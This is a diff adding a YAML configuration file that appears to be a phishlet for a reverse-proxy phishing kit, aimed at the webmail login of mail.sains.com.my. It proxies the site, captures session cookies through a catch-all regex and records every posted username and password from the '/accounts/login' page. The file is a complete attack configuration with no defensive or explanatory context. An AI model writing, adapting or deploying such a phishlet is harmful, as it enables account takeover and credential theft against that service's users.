@@ -1,0 +1,21 @@
+author: '@appeton666'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'mail.sains.com.my', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'mail.sains.com.my', orig_sub: '', domain: 'mail.sains.com.my', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: 'mail.sains.com.my'
+    keys: ['sessionid','.*,regexp']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'mail.sains.com.my'
+  path: '/accounts/login'
